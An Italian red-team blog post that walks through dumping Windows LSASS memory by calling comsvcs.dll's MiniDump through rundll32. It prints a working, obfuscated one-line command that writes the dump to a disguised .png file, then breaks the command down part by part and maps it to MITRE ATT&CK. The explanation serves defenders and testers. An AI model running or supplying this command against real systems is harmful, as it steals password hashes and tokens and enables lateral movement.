---
title: ~/redTeam/comsvcs-lsass.dump
url: https://blog.lobsec.com/2024/08/lsass-dump-via-comsvcs-dll/
source: Over Security - Cybersecurity news aggregator
date: 2024-10-29
fetch_date: 2025-10-06T18:53:46.264735
---

# ~/redTeam/comsvcs-lsass.dump

[Vai al contenuto](#content "Vai al contenuto")

[Lobsec](https://blog.lobsec.com/)

Yet another security blog

Menu

Menu

* [CV (ITA)](https://blog.lobsec.com/cv-ita/)
* [Privacy policy](https://blog.lobsec.com/privacy-policy/)

# ~/redTeam/comsvcs-lsass.dump

2024-08-21 di [lobst3r](https://blog.lobsec.com/author/lobst3r/ "Visualizza tutti gli articoli di lobst3r")

## Prefazione

Il processo **LSASS (Local Security Authority Subsystem Service)** è un componente fondamentale di Windows in quanto responsabile della gestione delle politiche di sicurezza locali, dell’autenticazione degli utenti e della generazione dei token di accesso.

LSASS memorizza e processa informazioni critiche come le credenziali degli utenti (password o hash delle password), i certificati di sicurezza e i token di accesso che sono essenziali per la gestione delle sessioni utente e delle risorse protette.

Un attaccante che riesca a compromettere LSASS potrebbe estrarre queste informazioni sensibili, permettendogli di ottenere accesso non autorizzato a sistemi e dati, eseguire attacchi di tipo “pass-the-hash” o persino impersonare utenti legittimi, facilitando movimenti laterali all’interno della rete e l’escalation dei privilegi.

## Dump

Un dump è una copia della memoria del processo mentre è in esecuzione. Questa copia contiene tutte le informazioni che LSASS sta gestendo in quel momento, inclusi dati sensibili come credenziali e token di accesso. Gli attaccanti spesso cercano di eseguire un dump di LSASS per estrarre queste informazioni critiche e utilizzarle per compromettere ulteriormente un sistema.

## L’attacco

**TL;DR** L’estratto che viene sotto riportato ha lo scopo di far leva sulla libreria comsvcs.dll, usando come proxy rundll32, per eseguire un dump del processo lsass allo scopo di poter successivamente ricavare gli hash di autenticazione.

### Il comando

```
%COMSPEC% /Q /c cmd.eXE /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\jvX7H.png full
```

### Dissezione del comando

**`%COMSPEC% /Q /c`**: `%COMSPEC%` è una variabile d’ambiente di Windows che punta all’interprete dei comandi (`cmd.exe`). Questo comando avvia il `cmd.exe` con l’opzione `/Q`, che sopprime la visualizzazione del prompt di comando, e l’opzione `/c`, che esegue il comando successivo e poi termina.

**`cmd.eXE /Q /c`**: Questo esegue un’ulteriore istanza di `cmd.exe`, sempre con le stesse opzioni `/Q` e `/c`, per aumentare il livello di offuscamento.

**`for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\jvX7H.png full`**: Questa parte è la più complessa e contiene l’operazione effettiva che viene eseguita.

* **`for /f "tokens=1,2 delims= " ^%A in (...) do ...`**: Il ciclo `for /f` in batch è utilizzato per leggere righe di output di un comando. L’opzione `tokens=1,2 delims=` specifica che i campi da elaborare sono il primo e il secondo, separati da spazi.
* **`'tasklist /fi "Imagename eq lsass.exe" | find "lsass"'`**: Il comando all’interno delle parentesi esegue un filtro sulla lista dei processi per identificare il processo `lsass.exe`. `tasklist` viene usato con un filtro (`/fi`) per cercare il processo `lsass.exe`. Successivamente, l’output viene passato a `find` per cercare il nome del processo.
* **`rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\jvX7H.png full`**: Se il processo `lsass.exe` viene trovato, il ciclo `for` esegue il comando `rundll32.exe`, che carica una DLL e invoca una funzione esportata all’interno della DLL. In questo caso, viene invocata la DLL `comsvcs.dll` con un parametro offuscato `#+0000^24 ^%B`. Il risultato dell’operazione di dump viene scritto nel file \Windows\Temp\jvX7H.png

## comsvcs.dll, #+0000^24 ^%B … full

### La DLL

La **DLL `comsvcs.dll`** (COM+ Services DLL) è un file di sistema di Windows che fornisce funzionalità per i servizi COM+ (Component Object Model Plus). La DLL `comsvcs.dll` contiene vari metodi e funzioni che vengono utilizzati per la gestione delle transazioni, la sicurezza, la sincronizzazione e altre operazioni di base nei servizi COM+.

### MITRE ATT&CK

1. [T1003.001](https://attack.mitre.org/techniques/T1003/001/) – OS Credential Dumping: LSASS Memory
2. [T1569](https://attack.mitre.org/techniques/T1569/) – System Services

### Parametri

1. **#+0000^24**: indica il valore ordinale della funzione “MiniDump”
2. **^%B**: indica il PID associato al processo lsass.exe
3. **`\Windows\Temp\jvX7H.png`** indica il file di uscita contenente il dump
4. **full:** direttiva per l’esportazione completa

## Crediti

* [LSASSY](https://github.com/login-securite/lsassy)

EOF

Categorie [active directory](https://blog.lobsec.com/category/active-directory/), [cyber](https://blog.lobsec.com/category/cyber/), [red team](https://blog.lobsec.com/category/red-team/) Tag [comsvcs](https://blog.lobsec.com/tag/comsvcs/), [dump](https://blog.lobsec.com/tag/dump/), [evasion tecnique](https://blog.lobsec.com/tag/evasion-tecnique/), [lsass](https://blog.lobsec.com/tag/lsass/)

[~/docs/ips-ids.security](https://blog.lobsec.com/2024/08/docs-ips-ids-security/)

[/usr/bin/touch nuova\_era](https://blog.lobsec.com/2024/10/lobsec-nuova-era/)

### Lascia un commento [Annulla risposta](/2024/08/lsass-dump-via-comsvcs-dll/#respond)

Commento

Nome
Email
Sito web

[ ]  Salva il mio nome, email e sito web in questo browser per la prossima volta che commento.

Δ

* [Analisi di un dropper HTML/JS per Internet Explorer basato su ActiveX e regsvr32](https://blog.lobsec.com/2025/08/analisi-di-un-dropper-html-js-per-internet-explorer-basato-su-activex-e-regsvr32/)
* [Kekpi trojan dissection](https://blog.lobsec.com/2025/03/kekpi-malware-dissection/)
* [NIS2: il caos di cui non avevamo (forse) bisogno](https://blog.lobsec.com/2024/12/nis2-il-caos-di-cui-non-avevamo-forse-bisogno/)
* [~/news/blocklist.news](https://blog.lobsec.com/2024/10/blocklist-ioc-updated/)
* [~/tips/fortigate\_malware.feed](https://blog.lobsec.com/2024/10/fortigate-malware-feed/)
* [/usr/bin/touch nuova\_era](https://blog.lobsec.com/2024/10/lobsec-nuova-era/)

© 2025 Lobsec • Creato con [GeneratePress](https://generatepress.com)

Manage Consent

To provide the best experiences, we use technologies like cookies to store and/or access device information. Consenting to these technologies will allow us to process data such as browsing behavior or unique IDs on this site. Not consenting or withdrawing consent, may adversely affect certain features and functions.

Functional

[ ]
Functional
Sempre attivo

The technical storage or access is strictly necessary for the legitimate purpose of enabling the use of a specific service explicitly requested by the subscriber or user, or for the sole purpose of carrying out the transmission of a communication over an electronic communications network.

Preferences

[ ]
Preferences

The technical storage or access is necessary for the legitimate purpose of storing preferences that are not requested by the subscriber or user.

Statistics

[ ]
Statistics

The technical storage or access that is used exclusively for statistical purposes.
The technical storage or access that is used exclusively for anonymous statistical purposes. Without a subpoena, voluntary compliance on the part of your Internet Service Provider, or additional records from a third party, information stored or retrieved for this purpose alone cannot usually be used to identify you.

Marketing

[ ]
Marketing

The technical storage or access is required to create user profiles to send advertising, or to track the user on a website or across several websites for similar marketing purposes.

Gestisci opzioni
Gestisci servizi
Gestisci {vendor\_count} fornitori
[Per saperne di più su questi scopi](https://cookiedatabase.org/tcf/purpos...